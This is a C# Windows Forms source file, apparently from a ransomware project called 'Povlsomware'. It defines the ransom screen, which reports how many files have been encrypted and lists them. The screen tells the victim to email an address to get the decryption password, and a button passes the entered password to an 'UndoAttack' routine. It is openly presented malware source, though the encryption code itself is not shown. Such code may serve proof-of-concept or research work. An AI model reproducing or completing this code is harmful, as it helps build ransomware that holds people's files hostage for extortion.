using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Povlsomware
{
    public partial class PayM3 : Form
    {
        public PayM3()
        {
            InitializeComponent();
            label2.Text = Program.count.ToString() + " files have been encrypted";
            listBox1.Items.AddRange(Program.myFiles.ToArray());

            textBox2.Text = 
                "Your files can only be retrived by entering the correct password. \n\r" +
                "In order to get the password please send a mail to \n\r " +
                "no-reply@forgetit.com.";
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string hihi = textBox1.Text;
            if (hihi.Length > 0)
            {
                button1.Text = "Decrypting... Please wait";
                Program.UndoAttack(hihi);
            }
        }

        private void PayM3_Load(object sender, EventArgs e)
        {

        }

    }
}
